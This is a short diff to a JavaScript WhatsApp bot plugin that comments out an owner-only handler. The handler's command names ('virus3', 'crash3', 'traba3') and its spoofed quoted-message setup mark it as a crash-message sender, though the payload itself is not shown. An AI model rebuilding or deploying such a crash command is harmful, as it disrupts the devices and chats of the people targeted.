@@ -1,4 +1,4 @@
-const { prepareWAMessageMedia, proto, generateWAMessageFromContent } = (await import('@adiwajshing/baileys')).default
+/*const { prepareWAMessageMedia, proto, generateWAMessageFromContent } = (await import('@adiwajshing/baileys')).default
 let handler = async (m, { conn, text, args, usedPrefix, command }) => {	   
 const doc = { 
 key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m ? { remoteJid: "" } : {})},
@@ -22,3 +22,4 @@ conn.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 handler.command = ['virus3', 'c3', 'binario3', 'traba3', 'crash3'] 
 handler.rowner = true
 export default handler
+*/
